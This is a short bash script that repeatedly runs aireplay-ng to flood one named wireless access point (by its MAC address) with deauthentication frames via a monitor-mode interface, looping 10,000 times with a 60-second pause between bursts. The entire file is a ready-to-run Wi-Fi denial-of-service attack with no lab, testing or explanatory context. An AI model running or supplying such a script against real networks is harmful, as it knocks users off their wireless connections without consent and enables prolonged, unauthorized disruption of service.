#! /bin/bash

for i in {1..10000}

do

	aireplay-ng --deauth 1000 -a DC:2C:6E:37:03:BE wlan0mon

	sleep 60s

done

